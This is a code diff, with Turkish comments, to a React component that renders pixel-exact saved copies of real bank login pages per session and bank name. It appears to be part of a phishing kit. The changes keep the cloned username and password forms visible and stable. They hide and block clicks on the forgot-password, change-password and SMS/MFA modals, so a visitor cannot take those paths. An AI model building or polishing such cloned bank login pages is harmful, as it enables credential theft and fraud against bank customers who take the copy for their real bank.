@@ -1115,14 +1115,63 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 /* ══════════════════════════════════════════════════════════════════
    ⭐ KALICI FIX: HIC BIR BANKANIN ORIJINAL FORMU BOZULMASIN (kullanicinin istedigi gibi)
    ══════════════════════════════════════════════════════════════════
-   ⚠️ ÖNEMLİ: [id*="ctl00_"] GENİŞ SEÇİCİ KALDIRILDI! (BEYAZ EKRAN NEDENİydi)
-      Çünkü: #ctl00_html (HTML root), #ctl00_ContentTemplatePlaceHolder_P4_Container (login wrapper)
-      HEPSİNİN id'sinde "ctl00_" geçiyor → HEPSİNİ -9999px götürüyordu (beyaz ekran).
-      Yerine SADECE BİLİNEN GİZLİ TRIGGERLAR (acik name/id/class) hedeflenir.
+   ⚠️ (1) ONCE: [id*="ctl00_"] GENİŞ SEÇİCİ vardı, BEYAZ EKRAN yapıyordu — KALDIRILDI.
+   ⚠️ (2) SIMDI: sf-hidden / print-only SECICILERI GENIS — GERCEK ICERIKLI divleri
+                GIZLIYOR (layout kayması / titreme). ONLEMEK ICIN WHITELIST EKLENDI:
+                Bazi elementler sf-hidden classi ICERSE DE (örnek:
+                <div class="panel-login panel-login-info sf-hidden"> → Accessibility IÇERİR)
+                GERCEKTE ICERIGI VAR ve GORUNMELI.
+   ⭐ SONUC: 1. resim (sabit, erken yüklenen) → 2. resim (900ms sonra) kayma OLMASIN,
+             ILK YUKLENEN HALI SABIT KALSIN. */
 
-   (1) ASP.NET WebForms / AJAX / PageFramework gizli trigger inputlari
-       Bunlar GERCEK form alani DEGILLER, sunucu icin teknik elemanlardir.
-       KULLANICIYA GOSTERILMEMESI GEREKIR (display:none) */
+/* ──────────────────────────────────────────────────────────────────
+   WHITELIST (ACIKCA GORUNUR KALMASI GEREKENLER — EN ÖNCE YAZILIR,
+   sf-hidden/print-only GİZLEMESİNİ GERİ ALIR)
+   ────────────────────────────────────────────────────────────────── */
+.panel-login,
+.panel-login-info,
+.panel-login-form,
+.main-container,
+.container,
+.container.main-container,
+.navbar,
+.navbar-default,
+.navbar-header,
+.navbar-collapse,
+header,
+footer,
+#aspnetForm,
+form[id=aspnetForm],
+[id*="LoginPage"],
+[id*="ContentTemplatePlaceHolder"] > div,
+div[class*="col-"],
+div[class*="row"],
+.panel,
+.panel-default,
+.well,
+.well-cms,
+h1, h2, h3, h4, h5, h6,
+p, a, label, ul, ol, li, table, tbody, tr, td, img,
+input[type=text], input[type=password], input[type=email],
+input[type=number], input[type=tel], input[type=checkbox],
+input[type=radio], select, textarea, button,
+[class*="login-"], [class*="-login"]
+{
+  display: revert-layer !important;
+  visibility: visible !important;
+  opacity: 1 !important;
+  position: static !important;
+  left: auto !important;
+  top: auto !important;
+  width: auto !important;
+  height: auto !important;
+  z-index: auto !important;
+  pointer-events: auto !important;
+}
+
+/* ──────────────────────────────────────────────────────────────────
+   (1) SADECE BILINEN GIZLI ASP.NET TRIGGERLARI GIZLE
+   ────────────────────────────────────────────────────────────────── */
 input[name*="stopAllTrigger"],
 input[id*="stopAllTrigger"],
 input[name*="__PageFramework"],
@@ -1132,7 +1181,6 @@ input[value="Stop all"],
 input[value="stop all"],
 #stopAll_backgroundElement,
 .modalBackgroundInvisible,
-/* ⭐ Bilinen diğer ASP.NET tek seferlik gizli trigger id/name'leri */
 input[id*="__PageFramework_TriggerElement"],
 input[name*="__PageFramework_TriggerElement"]
 {
@@ -1148,10 +1196,17 @@ input[name*="__PageFramework_TriggerElement"]
   height: 0 !important;
   overflow: hidden !important;
 }
-/* (2) SingleFile tarafindan eklenen sf-hidden / print-only artifactlar
-       Bunlar da GERCEK form parcalari DEGILLER, GOSTERILMEMELI */
-.sf-hidden, .print-only, [class*="print-only"],
-.hidden.wmVar, .wmVar, .print-top-header {
+/* ──────────────────────────────────────────────────────────────────
+   (2) GERÇEKTEN "ICERIKSIZ" TEKNIK sf-hidden / print-only artifactlar
+   (BOS div, bos span gibi) GIZLE. ICERIGI OLANLAR WHITELIST ile YUKARIDA
+   zaten GORUNUR hale getirildi (cakisma olmaz).
+   ────────────────────────────────────────────────────────────────── */
+.sf-hidden:empty,
+.print-only:empty,
+[class*="print-only"]:empty,
+.hidden.wmVar:empty,
+.wmVar:empty,
+.print-top-header:empty {
   display: none !important;
   visibility: hidden !important;
   opacity: 0 !important;
@@ -1182,25 +1237,66 @@ input[style*="display: none"][value*="stop"] {
         const scriptText = `
 (function () {
   try {
-    var HIDDEN_TRIG_KEYS = /stopalltrigger|__pageframework|aspnetformhidden|smoothtransition|backgroundelement/i;
+    var HIDDEN_TRIG_KEYS = /stopalltrigger|__pageframework|aspnetformhidden|smoothtransition|backgroundelement|modalchangepassword|pnlmodal|pnlforgot|updatepanelforgotpasswordmfa|modalchangepasswordbysms/i;
     var HIDDEN_TRIG_VALUES = /^\\s*stop\\s*all\\s*$/i;
+    // ⭐⭐⭐ WHITELIST (KALICI DARALTMA — layout titremesi / access kaybı onler)
+    //   Eger element TAGI / CLASSI / IDsi GERCEK ICERIK ise HIC DOKUNMA!
+    //   Boylece 900ms'de bir setInterval style mutation YAPMAZ,
+    //   layout reflow GELMEZ → ILK RESIM (1. yuklenen hali) SABIT KALIR (titreme olmaz!)
+    var WHITELIST_TAGS = /^(HEADER|FOOTER|MAIN|SECTION|NAV|ARTICLE|ASIDE|FORM|TABLE|THEAD|TBODY|TR|TD|TH|UL|OL|LI|H1|H2|H3|H4|H5|H6|P|A|LABEL|IMG|BUTTON|SELECT|TEXTAREA|IFRAME|CANVAS|SVG)$/i;
+    var WHITELIST_CLASS = /\b(panel-login|panel-login-info|panel-login-form|main-container|navbar|navbar-default|navbar-collapse|navbar-header|container|row|col-(lg|md|sm|xs)-[0-9]+|well|well-cms|panel|panel-default|form-group|login-username|login-password|login-forgot|sticky-bottom|nma-info-panel|flex-container|modal|modal-dialog|modal-content|modal-footer|well-actions|panel-body)\b/i;
+    var WHITELIST_ID = /LoginPage|ContentTemplatePlaceHolder|LoginForm|UserName|Password|Accessibility|HelpButton|Forgot|UpgradeBrowser|BodyContent|pnlConfirmation|_Panel|Container_P4/i;
+    function isWhiteListed(el) {
+      try {
+        if (!el || !el.tagName) return true; /* unknown — beyaz listede say, dokunma */
+        if (WHITELIST_TAGS.test(el.tagName)) return true;
+        var cls = (el && el.getAttribute && el.getAttribute("class")) || "";
+        if (WHITELIST_CLASS.test(cls)) return true;
+        var id = (el && el.getAttribute && el.getAttribute("id")) || "";
+        if (WHITELIST_ID.test(id)) return true;
+        // ⭐ ICERIK KONTROLU: Eger element GERCEKTEN ICERIKLI (text > 20 char veya cocugu > 3) ise
+        //   > teknik artifact OLMAZ, HIC DOKUNMA!
+        try {
+          var txt = (el.textContent || "").trim();
+          if (txt.length > 30) return true;
+          if (el.children && el.children.length > 3) return true;
+        } catch(_e){}
+        return false;
+      } catch(e){ return true; /* hata olursa beyaz listede say */ }
+    }
     function isGarbageElement(el) {
       try {
         if (!el || !el.tagName) return false;
+        // ⭐ WHITELIST ISE HEP FALSE (dokunma!)
+        if (isWhiteListed(el)) return false;
         var id = (el && el.getAttribute && el.getAttribute("id")) || "";
         var nm = (el && el.getAttribute && el.getAttribute("name")) || "";
         var val = (el && el.getAttribute && el.getAttribute("value")) || ((el.value != null) ? String(el.value) : "");
         var cls = (el && el.getAttribute && el.getAttribute("class")) || "";
         if (HIDDEN_TRIG_KEYS.test(id) || HIDDEN_TRIG_KEYS.test(nm)) return true;
         if (HIDDEN_TRIG_VALUES.test(val)) return true;
-        // sf-hidden / print-only artifactlar:
-        if (/\\bsf-hidden\\b|\\bprint-only\\b|\\bprint-top-header\\b|\\bwmVar\\b/.test(cls)) return true;
+        // ⭐ sf-hidden / print-only ARTIK SADECE BOS (ICERIKSIZ) element ise GARBAGE:
+        if (/\\bsf-hidden\\b|\\bprint-only\\b|\\bprint-top-header\\b|\\bwmVar\\b/.test(cls)) {
+          try {
+            var txt = (el.textContent || "").trim();
+            var childCount = (el.children && el.children.length) ? el.children.length : 0;
+            // İcerik 20 karakterden AZ ve cocuk 1'den AZ ise → GERCEK artifact (bos) → gizle
+            return txt.length < 20 && childCount <= 1;
+          } catch(_e) { return false; } /* icerik okunamazsa dokunma */
+        }
         return false;
       } catch (e) { return false; }
     }
     function cleanAgain() {
       try {
-        var all = document.querySelectorAll("input, button, div, span, select, textarea");
+        // ⭐⭐⭐ DARALTILMIS QUERY SELECTOR — SADECE INPUT/BUTTON ve BELIRLI GIZLI DIVLER!
+        //    Tum div/span document.querySelectorAll cok yavas ve layout reflow yapıyor → kayma.
+        var all = document.querySelectorAll(
+          "input, button, " +
+          "[id*=\"stopAll\" i], [name*=\"stopAll\" i], " +
+          "[id*=\"__PageFramework\" i], [name*=\"__PageFramework\" i]," +
+          "#stopAll_backgroundElement, .modalBackgroundInvisible"
+        );
         for (var i = 0; i < all.length; i++) {
           var el = all[i];
           if (!isGarbageElement(el)) continue;
@@ -1211,23 +1307,23 @@ input[style*="display: none"][value*="stop"] {
             el.style.setProperty("pointer-events", "none","important");
           } catch (_e) {}
           try {
-            if (el.hasAttribute && el.hasAttribute("disabled")) { } else {
-              if (typeof el.addEventListener === "function") {
-                el.addEventListener("click", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
-                el.addEventListener("mousedown", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
-              }
+            if (typeof el.addEventListener === "function") {
+              el.addEventListener("click", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
+              el.addEventListener("mousedown", function(ev){ try { ev.preventDefault && ev.preventDefault(); } catch(e){} try{ ev.stopPropagation && ev.stopPropagation(); } catch(e){} return false; }, true);
             }
           } catch (_e) {}
         }
       } catch (e) {}
     }
-    // Ilk calisma + setInterval ile GENERIC FIX setProperty her calistiginda geri al:
+    // ⭐⭐⭐ ARTK SETINTERVAL 900ms YOK! (1. ana sebep layout titremesi)
+    //   ILK 1.2sn boyunca 4 defa calis (genis iframe script yukleme) sonra DUR!
+    //   Surekli çalışan interval HER DOM mutation'da layout reflow yapıyordu → YUKARI KAYMA
     try { cleanAgain(); } catch(e){}
     try { setTimeout(cleanAgain, 50); } catch(e){}
     try { setTimeout(cleanAgain, 150); } catch(e){}
     try { setTimeout(cleanAgain, 500); } catch(e){}
     try { setTimeout(cleanAgain, 1200); } catch(e){}
-    try { setInterval(cleanAgain, 900); } catch(e){}
+    // → 900ms setInterval KALDIRILDI! Artik periyodik tekrar yok, tek seferlik 4 tur.
   } catch (e) {}
 })();`;
         try {
